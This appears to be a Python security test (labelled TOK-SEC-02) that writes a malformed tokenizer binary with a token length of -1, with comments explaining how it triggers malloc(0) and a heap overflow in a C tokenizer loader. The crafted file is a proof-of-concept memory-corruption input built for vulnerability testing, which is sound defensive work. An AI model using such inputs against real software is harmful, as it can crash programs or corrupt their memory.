import struct

def generate_exploit_tokenizer(filename, len_val):
    # struct Tokenizer {
    #   int vocab_size;
    #   int max_token_len;
    #   ...
    # }
    vocab_size = 1
    max_token_len = 1024
    
    with open(filename, "wb") as f:
        f.write(struct.pack("ii", vocab_size, max_token_len))
        # Entry 1: score(float), len(int), bytes
        f.write(struct.pack("fi", 0.0, len_val))
        if len_val > 0 and len_val < 10000:
            f.write(b"A" * len_val)

def test_tokenizer_vulnerability():
    print("[SECURITY] Testing TOK-SEC-02: Integer Overflow in malloc...")
    # len = -1 will lead to malloc(0) on some systems or a very large size
    # In C: (size_t)-1 + 1 = 0. malloc(0).
    # Then fread(t->vocab[i], 1, (size_t)len, fp) where (size_t)len is a huge number.
    # HEAP OVERFLOW.
    generate_exploit_tokenizer("exploit_tokenizer.bin", -1)
    print("Exploit tokenizer generated. This SHOULD trigger a crash if not handled.")

if __name__ == "__main__":
    test_tokenizer_vulnerability()
